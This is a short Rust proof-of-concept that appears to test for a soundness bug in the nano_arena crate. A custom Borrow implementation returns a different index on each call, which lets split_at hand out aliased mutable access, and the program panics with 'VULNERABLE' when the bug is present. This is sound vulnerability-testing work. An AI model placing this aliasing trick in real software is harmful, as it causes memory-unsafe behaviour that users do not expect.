#![forbid(unsafe_code)]

use nano_arena::{Arena, ArenaAccess, Idx}; // ✅ 把 ArenaAccess 加进来
use std::{borrow::Borrow, cell::Cell};

struct ToggleIdx {
    first: Idx,
    second: Idx,
    state: Cell<bool>,
}

impl Borrow<Idx> for ToggleIdx {
    fn borrow(&self) -> &Idx {
        self.state.set(!self.state.get());
        if self.state.get() { &self.first } else { &self.second }
    }
}

fn main() {

    eprintln!("POC v3 running. pid={}", std::process::id());

    let mut arena = Arena::new();

    let first = arena.alloc(1i32);
    let second = arena.alloc(2i32);

    let toggle = ToggleIdx {
        first: first.clone(),
        second: second.clone(),
        state: Cell::new(false),
    };

    let (first_mut_ref, mut split_arena) = arena.split_at(toggle).unwrap();

    drop(first_mut_ref);

    if split_arena.get_mut(&first).is_some() {
        panic!("VULNERABLE: split_arena unexpectedly allows mutable access to `first` after split_at");
    }
}

